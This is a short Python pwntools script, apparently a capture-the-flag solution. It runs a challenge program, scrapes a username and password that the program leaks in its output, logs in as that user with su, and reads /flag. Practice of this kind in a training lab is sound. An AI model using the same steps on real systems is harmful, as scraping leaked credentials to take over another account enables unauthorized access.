#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

io = process("/challenge/run")

data = io.recvall()
username = data.split(b"Created user ")[1].split(b' with password ')[0].decode()
password = data.split(b"Created user ")[1].split(b' with password ')[1].split(b'\n')[0].decode()
print(username,password)

io.close()
io = process(['su',username])
io.sendline(password.encode())

io.sendline(b'cat /flag')

io.interactive()
